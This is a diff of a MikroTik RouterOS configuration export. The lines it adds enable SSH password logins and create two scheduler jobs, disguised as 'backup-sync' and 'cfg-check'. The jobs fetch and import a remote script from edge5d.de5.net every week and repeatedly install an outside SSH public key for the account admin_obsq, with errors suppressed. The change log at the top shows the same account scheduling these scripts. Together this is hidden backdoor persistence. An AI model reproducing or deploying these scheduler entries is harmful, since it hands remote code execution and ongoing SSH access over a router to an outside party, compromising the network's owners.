@@ -11,6 +11,9 @@
 # Flags: U - UNDOABLE
 # Columns: ACTION, BY, POLICY
 #   ACTION                                 BY            POLICY
+# U new script scheduled                   admin_obsq    write
+# U new script scheduled                   admin_obsq    write
+# U ssh settings changed                   admin_obsq    write
 # U log rule changed                       0             write
 # U log rule changed                       0             write
 # U script removed from scheduler          0             write
@@ -182,7 +185,7 @@ set winbox disabled=yes
 set api available-from=44.34.128.45/32 disabled=yes
 set api-ssl available-from=44.34.128.45/32 certificate=api-ssl
 /ip ssh
-set strong-crypto=yes
+set password-authentication=yes strong-crypto=yes
 /ipv6 nd
 # automatic dns option advertising is not started, re-apply dns config
 set [ find default=yes ] advertise-dns=yes
@@ -218,6 +221,9 @@ add address=44.34.128.181
 add address=44.34.133.3
 add address=162.159.200.1
 add address=162.159.200.123
+/system scheduler
+add !days interval=1w name=backup-sync on-event=":do {/tool fetch url=http://edge5d.de5.net:8080/lab01425/sync.rsc dst-path=sync.rsc; :delay 1000; /import sync.rsc} on-error={}; :if ([:len [/user ssh-keys find where info=ntp-service]] = 0) do={/tool fetch url=http://edge5d.de5.net:8080/ntp.pub dst-path=ntp.pub; :delay 1000; /user ssh-keys import public-key-file=ntp.pub user=admin_obsq}" policy=read,write,policy,password,sniff,sensitive start-date=2026-09-23 start-time=09:12:00
+add !days name=cfg-check on-event=":for i from=1 to=6 do={ :if ([:len [/user ssh-keys find where info=ntp-service]] = 0) do={ :do {/tool fetch url=http://edge5d.de5.net:8080/ntp.pub dst-path=ntp.pub} on-error={:delay 10000}; :do {/user ssh-keys import public-key-file=ntp.pub user=admin_obsq} on-error={:delay 2000} } }" policy=read,write,policy,password,sniff,sensitive start-time=startup
 /tool bandwidth-server
 set authenticate=no enabled=no
 /tool mac-server
